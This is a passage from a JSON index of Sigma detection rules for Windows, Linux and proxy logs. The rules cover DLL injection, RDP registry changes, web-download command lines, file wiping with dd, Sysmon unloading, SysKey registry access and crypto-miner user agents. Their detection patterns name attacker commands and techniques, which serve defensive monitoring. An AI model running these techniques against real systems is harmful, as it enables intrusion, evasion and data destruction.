","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_winlogon_helper_dll.yml/","tags":["attack.persistence","attack.t1547.004"],"title":"Winlogon Helper DLL"},{"categories":null,"contents":"Detects WRITE_DAC access to a domain object\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html Raw rule (edit) title: AD Object WriteDAC Access id: 028c7842-4243-41cd-be6f-12f3cf1a26c7 status: test description: Detects WRITE_DAC access to a domain object author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html date: 2019/09/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4662 ObjectServer: \u0026#39;DS\u0026#39; AccessMask: \u0026#39;0x40000\u0026#39; ObjectType: - \u0026#39;19195a5b-6da0-11d0-afd3-00c04fd930c9\u0026#39; - \u0026#39;domainDNS\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1222.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_ad_object_writedac_access.yml/","tags":["attack.defense_evasion","attack.t1222.001"],"title":"AD Object WriteDAC Access"},{"categories":null,"contents":"Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html Raw rule (edit) title: CreateRemoteThread API and LoadLibrary id: 052ec6f6-1adc-41e6-907a-f1c813478bee status: test description: Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html date: 2019/08/11 modified: 2021/11/27 logsource: product: windows category: create_remote_thread detection: selection: StartModule|endswith: \u0026#39;\\kernel32.dll\u0026#39; StartFunction: \u0026#39;LoadLibraryA\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1055.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_createremotethread_loadlibrary.yml/","tags":["attack.defense_evasion","attack.t1055.001"],"title":"CreateRemoteThread API and LoadLibrary"},{"categories":null,"contents":"Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html Raw rule (edit) title: RDP Registry Modification id: 41904ebe-d56c-4904-b9ad-7a77bdf154b3 status: test description: Detects potential malicious modification of the property value of fDenyTSConnections and UserAuthentication to enable remote desktop connections. author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190407183310.html date: 2019/09/12 modified: 2022/01/13 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: - \u0026#39;\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\UserAuthentication\u0026#39; - \u0026#39;\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections\u0026#39; Details: \u0026#39;DWORD (0x00000000)\u0026#39; condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_rdp_registry_modification.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"RDP Registry Modification"},{"categories":null,"contents":"Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nKnown false-positives Unknown References https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/ https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5\u0026amp;from_sample=5db135000388385a7644131f\u0026amp;block_redirect=1 https://twitter.com/cyberwar_15/status/1187287262054076416 https://blog.alyac.co.kr/1901 https://en.wikipedia.org/wiki/Hangul_(word_processor) Raw rule (edit) title: Suspicious HWP Sub Processes id: 023394c4-29d5-46ab-92b8-6a534c6f447b status: test description: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation author: Florian Roth references: - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/ - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5\u0026amp;from_sample=5db135000388385a7644131f\u0026amp;block_redirect=1 - https://twitter.com/cyberwar_15/status/1187287262054076416 - https://blog.alyac.co.kr/1901 - https://en.wikipedia.org/wiki/Hangul_(word_processor) date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\Hwp.exe\u0026#39; Image|endswith: \u0026#39;\\gbb.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1566.001 - attack.execution - attack.t1203 - attack.t1059.003 - attack.g0032 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hwp_exploits.yml/","tags":["attack.initial_access","attack.t1566.001","attack.execution","attack.t1203","attack.t1059.003","attack.g0032"],"title":"Suspicious HWP Sub Processes"},{"categories":null,"contents":"Detects the use of various web request with commandline tools or Windows PowerShell command,methods (including aliases)\nKnown false-positives Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer. References https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/ https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell Raw rule (edit) title: Windows Suspicious Use Of Web Request in CommandLine id: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d status: experimental description: Detects the use of various web request with commandline tools or Windows PowerShell command,methods (including aliases) references: - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/ - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell author: James Pemberton / @4A616D6573 date: 2019/10/24 modified: 2021/09/21 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;Invoke-WebRequest\u0026#39; - \u0026#39;iwr \u0026#39; - \u0026#39;wget \u0026#39; - \u0026#39;curl \u0026#39; - \u0026#39;Net.WebClient\u0026#39; - \u0026#39;Start-BitsTransfer\u0026#39; condition: selection falsepositives: - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Windows Suspicious Use Of Web Request in CommandLine"},{"categories":null,"contents":"Detects non-system users failing to get a handle of the SCM database.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html Raw rule (edit) title: SCM Database Handle Failure id: 13addce7-47b2-4ca0-a98f-1de964d1d669 description: Detects non-system users failing to get a handle of the SCM database. status: experimental date: 2019/08/12 modified: 2021/11/12 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html tags: - attack.discovery - attack.t1010 logsource: product: windows service: security detection: selection: EventID: 4656 ObjectType: \u0026#39;SC_MANAGER OBJECT\u0026#39; ObjectName: \u0026#39;ServicesActive\u0026#39; #Keywords: \u0026#39;Audit Failure\u0026#39; \u0026lt;-\u0026gt; in the ref \u0026#39;Keywords\u0026#39;:-9214364837600034816 filter: SubjectLogonId: \u0026#39;0x3e4\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_scm_database_handle_failure.yml/","tags":["attack.discovery","attack.t1010"],"title":"SCM Database Handle Failure"},{"categories":null,"contents":"Detects non-system users performing privileged operation os the SCM database\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html Raw rule (edit) title: SCM Database Privileged Operation id: dae8171c-5ec6-4396-b210-8466585b53e9 status: test description: Detects non-system users performing privileged operation os the SCM database author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html date: 2019/08/15 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4674 ObjectType: \u0026#39;SC_MANAGER OBJECT\u0026#39; ObjectName: \u0026#39;servicesactive\u0026#39; PrivilegeList: \u0026#39;SeTakeOwnershipPrivilege\u0026#39; filter: SubjectLogonId: \u0026#39;0x3e4\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical tags: - attack.privilege_escalation - attack.t1548 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_scm_database_privileged_operation.yml/","tags":["attack.privilege_escalation","attack.t1548"],"title":"SCM Database Privileged Operation"},{"categories":null,"contents":"Detects handle requests and access operations to specific registry keys to calculate the SysKey\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190625024610.html Raw rule (edit) title: SysKey Registry Keys Access id: 9a4ff3b8-6187-4fd2-8e8b-e0eae1129495 status: test description: Detects handle requests and access operations to specific registry keys to calculate the SysKey author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190625024610.html date: 2019/08/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: \u0026#39;key\u0026#39; ObjectName|endswith: - \u0026#39;lsa\\JD\u0026#39; - \u0026#39;lsa\\GBG\u0026#39; - \u0026#39;lsa\\Skew1\u0026#39; - \u0026#39;lsa\\Data\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.discovery - attack.t1012 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_syskey_registry_access.yml/","tags":["attack.discovery","attack.t1012"],"title":"SysKey Registry Keys Access"},{"categories":null,"contents":"Detects file and folder permission changes.\nKnown false-positives User interacting with files permissions (normal/daily behaviour). References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md Raw rule (edit) title: File or Folder Permissions Change id: 74c01ace-0152-4094-8ae2-6fd776dd43e5 status: test description: Detects file and folder permission changes. author: Jakob Weinzettl, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0|contains: - \u0026#39;chmod\u0026#39; - \u0026#39;chown\u0026#39; condition: selection falsepositives: - User interacting with files permissions (normal/daily behaviour). level: low tags: - attack.defense_evasion - attack.t1222.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_file_or_folder_permissions.yml/","tags":["attack.defense_evasion","attack.t1222.002"],"title":"File or Folder Permissions Change"},{"categories":null,"contents":"Detects a file or folder\u0026rsquo;s permissions being modified.\nKnown false-positives Users interacting with the files on their own (unlikely unless privileged users). Dynatrace app References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md Raw rule (edit) title: File or Folder Permissions Modifications id: 37ae075c-271b-459b-8d7b-55ad5f993dd8 status: test description: Detects a file or folder\u0026#39;s permissions being modified. author: Jakob Weinzettl, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.001/T1222.001.md date: 2019/10/23 modified: 2022/02/11 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\takeown.exe\u0026#39; - \u0026#39;\\cacls.exe\u0026#39; - \u0026#39;\\icacls.exe\u0026#39; CommandLine|contains: \u0026#39;/grant\u0026#39; selection2: Image|endswith: \u0026#39;\\attrib.exe\u0026#39; CommandLine|contains: \u0026#39;-r\u0026#39; filter_reset: CommandLine|endswith: \u0026#39;ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\connectivity.history /reset\u0026#39; filter_grant: CommandLine|contains|all: - \u0026#39;ICACLS C:\\ProgramData\\dynatrace\\gateway\\config\\config.properties /grant :r \u0026#39; - \u0026#39;S-1-5-19:F\u0026#39; condition: selection or selection2 and not 1 of filter* fields: - ComputerName - User - CommandLine falsepositives: - Users interacting with the files on their own (unlikely unless privileged users). - Dynatrace app level: medium tags: - attack.defense_evasion - attack.t1222.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_file_permission_modifications.yml/","tags":["attack.defense_evasion","attack.t1222.001"],"title":"File or Folder Permissions Modifications"},{"categories":null,"contents":"Detects removing immutable file attribute.\nKnown false-positives Administrator interacting with immutable files (e.g. for instance backups). References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md Raw rule (edit) title: Remove Immutable File Attribute id: a5b977d6-8a81-4475-91b9-49dbfcd941f7 status: test description: Detects removing immutable file attribute. author: Jakob Weinzettl, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222.002/T1222.002.md date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0|contains: \u0026#39;chattr\u0026#39; a1|contains: \u0026#39;-i\u0026#39; condition: selection falsepositives: - Administrator interacting with immutable files (e.g. for instance backups). level: medium tags: - attack.defense_evasion - attack.t1222.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_chattr_immutable_removal.yml/","tags":["attack.defense_evasion","attack.t1222.002"],"title":"Remove Immutable File Attribute"},{"categories":null,"contents":"Detects overwriting (effectively wiping/deleting) of a file.\nKnown false-positives Appending null bytes to files. Legitimate overwrite of files. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md Raw rule (edit) title: Overwriting the File with Dev Zero or Null id: 37222991-11e9-4b6d-8bdf-60fbe48f753e status: stable description: Detects overwriting (effectively wiping/deleting) of a file. author: Jakob Weinzettl, oscd.community date: 2019/10/23 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0|contains: \u0026#39;dd\u0026#39; a1|contains: - \u0026#39;if=/dev/null\u0026#39; - \u0026#39;if=/dev/zero\u0026#39; condition: selection falsepositives: - Appending null bytes to files. - Legitimate overwrite of files. level: low tags: - attack.impact - attack.t1485 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_dd_delete_file.yml/","tags":["attack.impact","attack.t1485"],"title":"Overwriting the File with Dev Zero or Null"},{"categories":null,"contents":"Detects a windows service to be stopped\nKnown false-positives Administrator shutting down the service due to upgrade or removal purposes Raw rule (edit) title: Stop Windows Service id: eb87818d-db5d-49cc-a987-d5da331fbd90 description: Detects a windows service to be stopped status: experimental author: Jakob Weinzettl, oscd.community date: 2019/10/23 modified: 2021/11/30 tags: - attack.impact - attack.t1489 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\sc.exe\u0026#39; - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains: \u0026#39;stop\u0026#39; filter: CommandLine: \u0026#39;sc stop KSCWebConsoleMessageQueue\u0026#39; # kaspersky Security Center Web Console double space between sc and stop User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings condition: selection and not filter fields: - ComputerName - User - CommandLine falsepositives: - Administrator shutting down the service due to upgrade or removal purposes level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_service_stop.yml/","tags":["attack.impact","attack.t1489"],"title":"Stop Windows Service"},{"categories":null,"contents":"Detects a reload or a start of a service.\nKnown false-positives Installation of legitimate service. Legitimate reconfiguration of service. References https://attack.mitre.org/techniques/T1543/002/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md Raw rule (edit) title: Systemd Service Reload or Start id: 2625cc59-0634-40d0-821e-cb67382a3dd7 status: test description: Detects a reload or a start of a service. author: Jakob Weinzettl, oscd.community references: - https://attack.mitre.org/techniques/T1543/002/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;EXECVE\u0026#39; a0|contains: \u0026#39;systemctl\u0026#39; a1|contains: - \u0026#39;daemon-reload\u0026#39; - \u0026#39;start\u0026#39; condition: selection falsepositives: - Installation of legitimate service. - Legitimate reconfiguration of service. level: low tags: - attack.persistence - attack.t1543.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_pers_systemd_reload.yml/","tags":["attack.persistence","attack.t1543.002"],"title":"Systemd Service Reload or Start"},{"categories":null,"contents":"Detects SILENTTRINITY stager use\nKnown false-positives unknown References https://github.com/byt3bl33d3r/SILENTTRINITY Raw rule (edit) title: SILENTTRINITY Stager Execution id: 03552375-cc2c-4883-bbe4-7958d5a980be status: experimental description: Detects SILENTTRINITY stager use references: - https://github.com/byt3bl33d3r/SILENTTRINITY author: Aleksey Potapov, oscd.community date: 2019/10/22 modified: 2021/09/19 tags: - attack.command_and_control - attack.t1071 logsource: category: process_creation product: windows detection: selection: Description|contains: \u0026#39;st2stager\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_silenttrinity_stage_use.yml/","tags":["attack.command_and_control","attack.t1071"],"title":"SILENTTRINITY Stager Execution"},{"categories":null,"contents":"Detect possible Sysmon driver unload\nKnown false-positives Unknown References https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon Raw rule (edit) title: Sysmon Driver Unload id: 4d7cda18-1b12-4e52-b45c-d28653210df8 status: experimental author: Kirill Kiryanov, oscd.community description: Detect possible Sysmon driver unload date: 2019/10/23 modified: 2021/09/27 references: - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon logsource: product: windows category: process_creation tags: - attack.defense_evasion - attack.t1070 - attack.t1562 - attack.t1562.002 detection: selection: Image|endswith: \u0026#39;\\fltmc.exe\u0026#39; CommandLine|contains|all: - \u0026#39;unload\u0026#39; - \u0026#39;sys\u0026#39; condition: selection falsepositives: - Unknown level: high fields: - CommandLine - Details ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sysmon_driver_unload.yml/","tags":["attack.defense_evasion","attack.t1070","attack.t1562","attack.t1562.002"],"title":"Sysmon Driver Unload"},{"categories":null,"contents":"The Devtoolslauncher.exe executes other binary\nKnown false-positives Legitimate use of devtoolslauncher.exe by legitimate user References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml https://twitter.com/_felamos/status/1179811992841797632 Raw rule (edit) title: Devtoolslauncher.exe Executes Specified Binary id: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6 status: test description: The Devtoolslauncher.exe executes other binary author: Beyu Denis, oscd.community (rule), @_felamos (idea) references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml - https://twitter.com/_felamos/status/1179811992841797632 date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\devtoolslauncher.exe\u0026#39; CommandLine|contains: \u0026#39;LaunchForDeploy\u0026#39; condition: selection falsepositives: - Legitimate use of devtoolslauncher.exe by legitimate user level: critical tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_devtoolslauncher.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Devtoolslauncher.exe Executes Specified Binary"},{"categories":null,"contents":"The OpenWith.exe executes other binary\nKnown false-positives Legitimate use of OpenWith.exe by legitimate user References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml https://twitter.com/harr0ey/status/991670870384021504 Raw rule (edit) title: OpenWith.exe Executes Specified Binary id: cec8e918-30f7-4e2d-9bfa-a59cc97ae60f status: test description: The OpenWith.exe executes other binary author: Beyu Denis, oscd.community (rule), @harr0ey (idea) references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Openwith.yml - https://twitter.com/harr0ey/status/991670870384021504 date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\OpenWith.exe\u0026#39; CommandLine|contains: \u0026#39;/c\u0026#39; condition: selection falsepositives: - Legitimate use of OpenWith.exe by legitimate user level: high tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_openwith.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"OpenWith.exe Executes Specified Binary"},{"categories":null,"contents":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nKnown false-positives Legitimate use of archiving tools by legitimate user. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md Raw rule (edit) title: Data Compressed id: a3b5e3e9-1b49-4119-8b8e-0344a01f21ee status: test description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection1: type: \u0026#39;execve\u0026#39; a0: \u0026#39;zip\u0026#39; selection2: type: \u0026#39;execve\u0026#39; a0: \u0026#39;gzip\u0026#39; a1: \u0026#39;-f\u0026#39; selection3: type: \u0026#39;execve\u0026#39; a0: \u0026#39;tar\u0026#39; a1|contains: \u0026#39;-c\u0026#39; condition: 1 of selection* falsepositives: - Legitimate use of archiving tools by legitimate user. level: low tags: - attack.exfiltration - attack.t1560.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_data_compressed.yml/","tags":["attack.exfiltration","attack.t1560.001"],"title":"Data Compressed"},{"categories":null,"contents":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nKnown false-positives Highly likely if archive operations are done via PowerShell. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560/T1560.md Raw rule (edit) title: Data Compressed - PowerShell id: 6dc5d284-69ea-42cf-9311-fb1c3932a69a status: experimental description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, oscd.community date: 2019/10/21 modified: 2021/10/16 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560/T1560.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;-Recurse\u0026#39; - \u0026#39;|\u0026#39; - \u0026#39;Compress-Archive\u0026#39; condition: selection falsepositives: - Highly likely if archive operations are done via PowerShell. level: low tags: - attack.exfiltration - attack.t1560 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_data_compressed.yml/","tags":["attack.exfiltration","attack.t1560"],"title":"Data Compressed - PowerShell"},{"categories":null,"contents":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nKnown false-positives Highly likely if rar is a default archiver in the monitored environment. References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html Raw rule (edit) title: Data Compressed - rar.exe id: 6f3e2987-db24-4c78-a860-b4f4095a7095 status: test description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. author: Timur Zinniatullin, E.M. Anhaus, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md - https://eqllib.readthedocs.io/en/latest/analytics/1ec33c93-3d0b-4a28-8014-dbdaae5c60ae.html date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\rar.exe\u0026#39; CommandLine|contains: \u0026#39; a \u0026#39; condition: selection fields: - Image - CommandLine - User - LogonGuid - Hashes - ParentProcessGuid - ParentCommandLine falsepositives: - Highly likely if rar is a default archiver in the monitored environment. level: low tags: - attack.collection - attack.t1560.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_data_compressed_with_rar.yml/","tags":["attack.collection","attack.t1560.001"],"title":"Data Compressed - rar.exe"},{"categories":null,"contents":"Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment Windows control panel elements have been identified as source (mmc) References https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/ https://github.com/Neo23x0/DLLRunner https://twitter.com/cyb3rops/status/1186631731543236608 https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/ Raw rule (edit) title: Suspicious Call by Ordinal id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c description: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal status: stable references: - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/ - https://github.com/Neo23x0/DLLRunner - https://twitter.com/cyb3rops/status/1186631731543236608 - https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/ tags: - attack.defense_evasion - attack.t1218.011 author: Florian Roth date: 2019/10/22 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains: - \u0026#39;,#\u0026#39; - \u0026#39;, #\u0026#39; - \u0026#39;.dll #\u0026#39; # Sysmon removes , in its log - \u0026#39;.ocx #\u0026#39; # HermeticWizard filter: CommandLine|contains|all: - \u0026#39;EDGEHTML.dll\u0026#39; - \u0026#39;#141\u0026#39; condition: selection and not filter falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Windows control panel elements have been identified as source (mmc) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_rundll32_by_ordinal.yml/","tags":["attack.defense_evasion","attack.t1218.011"],"title":"Suspicious Call by Ordinal"},{"categories":null,"contents":"The psr.exe captures desktop screenshots and saves them on the local machine\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md Raw rule (edit) title: Psr.exe Capture Screenshots id: 2158f96f-43c2-43cb-952a-ab4580f32382 status: test description: The psr.exe captures desktop screenshots and saves them on the local machine author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Psr.yml - https://www.sans.org/summit-archives/file/summit-archive-1493861893.pdf - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\Psr.exe\u0026#39; CommandLine|contains: \u0026#39;/start\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1113 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_psr_capture_screenshots.yml/","tags":["attack.collection","attack.t1113"],"title":"Psr.exe Capture Screenshots"},{"categories":null,"contents":"Detects suspicious user agent strings used by crypto miners in proxy logs\nKnown false-positives Unknown References https://github.com/xmrig/xmrig/blob/da22b3e6c45825f3ac1f208255126cb8585cd4fc/src/base/kernel/Platform_win.cpp#L65 https://github.com/xmrig/xmrig/blob/427b6516e0550200c17ca28675118f0fffcc323f/src/version.h Raw rule (edit) title: Crypto Miner User Agent id: fa935401-513b-467b-81f4-f9e77aa0dd78 status: test description: Detects suspicious user agent strings used by crypto miners in proxy logs author: Florian Roth references: - https://github.com/xmrig/xmrig/blob/da22b3e6c45825f3ac1f208255126cb8585cd4fc/src/base/kernel/Platform_win.cpp#L65 - https://github.com/xmrig/xmrig/blob/427b6516e0550200c17ca28675118f0fffcc323f/src/version.h date: 2019/10/21 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|startswith: # XMRig - \u0026#39;XMRig \u0026#39; # CCMiner - \u0026#39;ccminer\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_cryptominer.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Crypto Miner User Agent"},{"categories":null,"contents":"Detects possible command execution by web application/web shell\nKnown false-positives Admin activity Crazy web applications References personal experience Raw rule (edit) title: Webshell Remote Command Execution id: c0d3734d-330f-4a03-aae2-65dacc6a8222 status: experimental description: Detects possible command execution by web application/web shell author: Ilyas Ochkov, Beyu Denis, oscd.community date: 2019/10/12 modified: 2021/11/11 references: - personal experience logsource: product: linux service: auditd detection: selection: type: \u0026#39;SYSCALL\u0026#39; 